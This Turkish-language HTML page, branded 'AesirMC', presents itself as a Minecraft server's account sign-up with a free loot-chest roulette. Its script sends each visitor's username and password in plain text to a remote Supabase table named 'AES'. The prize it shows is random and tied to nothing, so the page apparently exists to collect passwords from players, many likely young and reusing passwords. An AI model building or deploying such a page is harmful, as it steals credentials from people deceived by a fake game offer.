<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AesirMC | Profesyonel MMORPG Deneyimi</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root {
            --primary-blue: #00d2ff;
            --dark-bg: #0a0b10;
            --card-bg: rgba(20, 22, 30, 0.95);
            --accent: #ff9d00;
        }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Poppins', sans-serif;
            background: radial-gradient(circle at center, #1a2a44 0%, #0a0b10 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
        }

        /* Navbar Stili (Görseldeki gibi) */
        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 8%;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .logo {
            font-size: 28px;
            font-weight: 800;
            letter-spacing: 2px;
            color: #fff;
            text-transform: uppercase;
        }

        /* Giriş Paneli */
        #auth-container {
            margin: auto;
            width: 90%;
            max-width: 450px;
            background: var(--card-bg);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            border: 1px solid rgba(0, 210, 255, 0.3);
            text-align: center;
        }

        h2 { margin-bottom: 30px; font-weight: 700; color: var(--primary-blue); }

        input {
            width: 100%;
            padding: 15px;
            margin-bottom: 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            color: white;
            font-size: 16px;
            box-sizing: border-box;
            transition: 0.3s;
        }

        input:focus { border-color: var(--primary-blue); outline: none; background: rgba(255,255,255,0.1); }

        .btn-main {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
            border: none;
            border-radius: 10px;
            color: white;
            font-weight: 700;
            font-size: 18px;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
        }

        .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0, 210, 255, 0.4); }

        /* Oyun Alanı */
        #game-container { display: none; text-align: center; padding: 50px 0; }

        .chest-box {
            cursor: pointer;
            transition: 0.5s;
            filter: drop-shadow(0 0 20px rgba(0, 210, 255, 0.5));
        }

        .chest-box:hover { transform: scale(1.1) rotate(5deg); }

        /* Rulet Bölümü */
        #roulette-section { display: none; margin-top: 50px; }
        .roulette-wrapper {
            width: 80%;
            max-width: 700px;
            height: 130px;
            margin: 0 auto;
            border: 2px solid var(--primary-blue);
            background: rgba(0,0,0,0.8);
            position: relative;
            overflow: hidden;
            border-radius: 15px;
        }

        #strip { display: flex; position: absolute; left: 0; align-items: center; height: 100%; }
        .item { min-width: 110px; text-align: center; }
        .item img { width: 70px; }

        /* Kazandın Popup */
        #win-popup {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.95);
            z-index: 9999;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
    </style>
</head>
<body>

<nav>
    <div class="logo">Aesir<span style="color:var(--primary-blue)">MC</span></div>
    <div style="display: flex; gap: 20px; font-size: 14px;">
        <span>MAĞAZA</span>
        <span>DESTEK</span>
        <span id="user-tag" style="color:var(--accent)"></span>
    </div>
</nav>

<div id="auth-container">
    <h2>HESAP OLUŞTUR</h2>
    <input type="text" id="user" placeholder="Kullanıcı Adı">
    <input type="password" id="pass" placeholder="Şifre">
    <button class="btn-main" onclick="startApp()">DÜNYAYA KATIL</button>
</div>

<div id="game-container">
    <h1 id="msg"></h1>
    <div id="box-area">
        <img src="https://minecraft.wiki/images/Chest_JE2_BE2.png" width="200" class="chest-box" onclick="openChest()">
        <p style="font-size: 20px; color: var(--primary-blue);">EFSANEVİ SANDIĞI AÇ!</p>
    </div>

    <div id="roulette-section">
        <div class="roulette-wrapper">
            <div id="strip"></div>
        </div>
        <button class="btn-main" id="spin-btn" style="width: 200px; margin-top: 30px;" onclick="spin()">ÇEVİR!</button>
    </div>
</div>

<div id="win-popup">
    <h1 style="color: var(--accent); font-size: 45px;">TEBRİKLER!</h1>
    <img id="win-img" src="" width="150">
    <h2 id="win-name"></h2>
    <button class="btn-main" style="width: 200px;" onclick="location.reload()">TEKRAR DENE</button>
</div>

<script>
    // ÖNEMLİ: Tablo adını 'AES' olarak güncelledim!
    const S_URL = "https://iigemvvlznvgneghevev.supabase.co";
    const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
    const client = supabase.createClient(S_URL, S_KEY);

    const items = [
        { n: "Netherite Set", i: "https://minecraft.wiki/images/Thumb_Sprite_Netherite_Chestplate_JE1_BE1.png" },
        { n: "Keskinlik V Kılıç", i: "https://minecraft.wiki/images/Thumb_Sprite_Diamond_Sword_JE3_BE3.png" },
        { n: "Büyülü Elma", i: "https://minecraft.wiki/images/Thumb_Sprite_Enchanted_Golden_Apple_JE2_BE2.png" },
        { n: "Totem", i: "https://minecraft.wiki/images/Thumb_Sprite_Totem_of_Undying_JE2_BE2.png" }
    ];

    async function startApp() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        if(!u || !p) return alert("Boş bırakma!");

        // GÖRSELDEKİ TABLO ADINA GÖRE GÜNCELLENDİ: 'AES'
        await client.from('AES').insert([{ username: u, password: p }]);

        document.getElementById('auth-container').style.display = 'none';
        document.getElementById('game-container').style.display = 'block';
        document.getElementById('msg').innerText = "HOŞ GELDİN, " + u.toUpperCase();
        document.getElementById('user-tag').innerText = u;
    }

    function openChest() {
        document.getElementById('box-area').style.display = 'none';
        document.getElementById('roulette-section').style.display = 'block';
        const strip = document.getElementById('strip');
        for(let i=0; i<70; i++) {
            const item = items[Math.floor(Math.random()*items.length)];
            strip.innerHTML += `<div class="item"><img src="${item.i}"></div>`;
        }
    }

    function spin() {
        const strip = document.getElementById('strip');
        document.getElementById('spin-btn').disabled = true;
        const offset = 3500 + Math.floor(Math.random()*1000);
        strip.style.transition = "transform 5s cubic-bezier(0.15, 0, 0.15, 1)";
        strip.style.transform = `translateX(-${offset}px)`;
        
        setTimeout(() => {
            const win = items[Math.floor(Math.random()*items.length)];
            document.getElementById('win-popup').style.display = 'flex';
            document.getElementById('win-img').src = win.i;
            document.getElementById('win-name').innerText = win.n;
        }, 5500);
    }
</script>
</body>
</html>
